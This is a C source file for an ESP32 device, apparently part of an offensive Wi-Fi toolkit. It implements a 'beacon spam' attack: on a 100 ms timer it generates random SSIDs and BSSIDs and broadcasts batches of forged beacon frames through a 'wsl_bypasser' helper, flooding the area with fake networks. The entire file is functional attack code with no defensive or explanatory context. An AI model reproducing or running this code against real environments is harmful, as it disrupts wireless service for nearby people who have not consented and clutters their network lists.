#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_random.h"
#include <string.h>

static const char *TAG = "attack_beacon_spam";
static esp_timer_handle_t beacon_timer_handle;
static uint8_t beacon_count = 20;

// Function to generate random SSID
static void generate_random_ssid(uint8_t *ssid, uint8_t *length) {
    *length = 6 + esp_random() % (32 - 6); // Length between 6 and 32
    for (int i = 0; i < *length; i++) {
        // Printable ASCII characters from 0x20 to 0x7E
        ssid[i] = 0x20 + (esp_random() % (0x7E - 0x20));
    }
}

// Timer callback to send beacon frames
static void timer_send_beacon(void *arg) {
    for (int i = 0; i < beacon_count; i++) {
        uint8_t ssid[32];
        uint8_t ssid_length;
        generate_random_ssid(ssid, &ssid_length);
        
        // Generate random BSSID
        uint8_t bssid[6];
        for (int j = 0; j < 6; j++) {
            bssid[j] = esp_random() & 0xFF;
        }
        
        // Send beacon frame
        wsl_bypasser_send_beacon_frame(bssid, ssid, ssid_length, 1);
    }
    ESP_LOGD(TAG, "Sent %d beacon frames", beacon_count);
}

void attack_beacon_spam_start(uint8_t count) {
    beacon_count = count > 0 ? count : 20;
    
    // Create periodic timer
    const esp_timer_create_args_t beacon_timer_args = {
        .callback = &timer_send_beacon,
    };
    ESP_ERROR_CHECK(esp_timer_create(&beacon_timer_args, &beacon_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(beacon_timer_handle, 100000)); // 100ms
    
    ESP_LOGI(TAG, "Beacon spam started with %d fake networks", beacon_count);
}

void attack_beacon_spam_stop() {
    ESP_ERROR_CHECK(esp_timer_stop(beacon_timer_handle));
    esp_timer_delete(beacon_timer_handle);
    ESP_LOGI(TAG, "Beacon spam stopped");
}
